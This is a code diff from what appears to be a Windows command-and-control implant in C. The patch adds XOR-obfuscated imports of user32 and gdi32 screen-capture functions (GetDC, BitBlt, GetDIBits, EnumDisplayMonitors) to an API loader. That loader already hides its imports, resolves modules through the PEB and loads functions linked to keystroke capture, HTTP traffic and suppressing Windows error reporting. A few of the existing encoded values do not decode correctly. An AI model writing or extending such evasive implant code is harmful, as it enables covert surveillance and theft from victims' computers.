@@ -150,6 +150,21 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_ToUnicodeEx[] = {14, 53, 15, 52, 51, 57, 53, 62, 63, 31, 34};
   static const unsigned char enc_RegisterClassExW[] = {8, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 31, 34, 13};
   static const unsigned char enc_MsgWaitForMultipleObjects[] = {23, 41, 61, 13, 59, 51, 46, 28, 53, 40, 23, 47, 54, 46, 51, 42, 54, 63, 21, 56, 48, 63, 57, 46, 41};
+  static const unsigned char enc_GetDC[] = {0x1D, 0x3F, 0x2E, 0x1E, 0x19};
+  static const unsigned char enc_ReleaseDC[] = {0x08, 0x3F, 0x36, 0x3F, 0x3B, 0x29, 0x3F, 0x1E, 0x19};
+  static const unsigned char enc_GetSystemMetrics[] = {0x1D, 0x3F, 0x2E, 0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x17, 0x3F, 0x2E, 0x28, 0x33, 0x39, 0x29};
+  static const unsigned char enc_EnumDisplayMonitors[] = {0x1F, 0x34, 0x2F, 0x37, 0x1E, 0x33, 0x29, 0x2A, 0x36, 0x3B, 0x23, 0x17, 0x35, 0x34, 0x33, 0x2E, 0x35, 0x28, 0x29};
+  static const unsigned char enc_GetMonitorInfoA[] = {0x1D, 0x3F, 0x2E, 0x17, 0x35, 0x34, 0x33, 0x2E, 0x35, 0x28, 0x13, 0x34, 0x3C, 0x35, 0x1B};
+
+  /* gdi32 functions */
+  static const unsigned char enc_gdi32_dll[] = {0x3D, 0x3E, 0x33, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36};
+  static const unsigned char enc_CreateCompatibleDC[] = {0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x19, 0x35, 0x37, 0x2A, 0x3B, 0x2E, 0x33, 0x38, 0x36, 0x3F, 0x1E, 0x19};
+  static const unsigned char enc_CreateCompatibleBitmap[] = {0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x19, 0x35, 0x37, 0x2A, 0x3B, 0x2E, 0x33, 0x38, 0x36, 0x3F, 0x18, 0x33, 0x2E, 0x37, 0x3B, 0x2A};
+  static const unsigned char enc_SelectObject[] = {0x09, 0x3F, 0x36, 0x3F, 0x39, 0x2E, 0x15, 0x38, 0x30, 0x3F, 0x39, 0x2E};
+  static const unsigned char enc_BitBlt[] = {0x18, 0x33, 0x2E, 0x18, 0x36, 0x2E};
+  static const unsigned char enc_GetDIBits[] = {0x1D, 0x3F, 0x2E, 0x1E, 0x13, 0x18, 0x33, 0x2E, 0x29};
+  static const unsigned char enc_DeleteObject[] = {0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x15, 0x38, 0x30, 0x3F, 0x39, 0x2E};
+  static const unsigned char enc_DeleteDC[] = {0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x1E, 0x19};
 
   /* kernel32 functions */
   static const unsigned char enc_CreateProcessA[] = {25, 40, 63, 59, 46, 63, 10, 40, 53, 57, 63, 41, 41, 27};
@@ -257,7 +272,7 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_wer_dll[] = {45, 63, 40, 104, 62, 54, 54};
   static const unsigned char enc_WerSetFlags[] = {85, 63, 40, 89, 63, 62, 124, 54, 59, 61, 41};
 
-  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32];
+  char dll_user32[32], dll_kernel32[32], dll_advapi32[32], dll_bcrypt[32], dll_shell32[32], dll_winhttp[32], dll_iphlpapi[32], dll_wer[32], dll_gdi32[32];
   c2t_win32_xor_decode(dll_user32, enc_user32_dll, sizeof(enc_user32_dll), 0x5A);
   c2t_win32_xor_decode(dll_kernel32, enc_kernel32_dll, sizeof(enc_kernel32_dll), 0x5A);
   c2t_win32_xor_decode(dll_advapi32, enc_advapi32_dll, sizeof(enc_advapi32_dll), 0x5A);
@@ -266,6 +281,7 @@ void c2t_win32_api_init(void) {
   c2t_win32_xor_decode(dll_winhttp, enc_winhttp_dll, sizeof(enc_winhttp_dll), 0x5A);
   c2t_win32_xor_decode(dll_iphlpapi, enc_iphlpapi_dll, sizeof(enc_iphlpapi_dll), 0x5A);
   c2t_win32_xor_decode(dll_wer, enc_wer_dll, sizeof(enc_wer_dll), 0x5A);
+  c2t_win32_xor_decode(dll_gdi32, enc_gdi32_dll, sizeof(enc_gdi32_dll), 0x5A);
 
   HMODULE hKernel32 = c2t_win32_get_module_peb(L"kernel32.dll");
   if (!hKernel32) hKernel32 = GetModuleHandleA(dll_kernel32);
@@ -274,6 +290,10 @@ void c2t_win32_api_init(void) {
   HMODULE hUser32 = c2t_win32_get_module_peb(L"user32.dll");
   if (!hUser32) hUser32 = GetModuleHandleA(dll_user32);
   if (!hUser32 && hKernel32) hUser32 = LoadLibraryA(dll_user32);
+
+  HMODULE hGdi32 = c2t_win32_get_module_peb(L"gdi32.dll");
+  if (!hGdi32) hGdi32 = GetModuleHandleA(dll_gdi32);
+  if (!hGdi32 && hKernel32) hGdi32 = LoadLibraryA(dll_gdi32);
 
   HMODULE hAdvapi32 = c2t_win32_get_module_peb(L"advapi32.dll");
   if (!hAdvapi32) hAdvapi32 = GetModuleHandleA(dll_advapi32);
@@ -346,6 +366,20 @@ void c2t_win32_api_init(void) {
   LOAD_API(hUser32, ToUnicodeEx, enc_ToUnicodeEx);
   LOAD_API(hUser32, RegisterClassExW, enc_RegisterClassExW);
   LOAD_API(hUser32, MsgWaitForMultipleObjects, enc_MsgWaitForMultipleObjects);
+  LOAD_API(hUser32, GetDC, enc_GetDC);
+  LOAD_API(hUser32, ReleaseDC, enc_ReleaseDC);
+  LOAD_API(hUser32, GetSystemMetrics, enc_GetSystemMetrics);
+  LOAD_API(hUser32, EnumDisplayMonitors, enc_EnumDisplayMonitors);
+  LOAD_API(hUser32, GetMonitorInfoA, enc_GetMonitorInfoA);
+
+  /* gdi32 */
+  LOAD_API(hGdi32, CreateCompatibleDC, enc_CreateCompatibleDC);
+  LOAD_API(hGdi32, CreateCompatibleBitmap, enc_CreateCompatibleBitmap);
+  LOAD_API(hGdi32, SelectObject, enc_SelectObject);
+  LOAD_API(hGdi32, BitBlt, enc_BitBlt);
+  LOAD_API(hGdi32, GetDIBits, enc_GetDIBits);
+  LOAD_API(hGdi32, DeleteObject, enc_DeleteObject);
+  LOAD_API(hGdi32, DeleteDC, enc_DeleteDC);
 
   /* kernel32 */
   LOAD_API(hKernel32, CreateProcessA, enc_CreateProcessA);
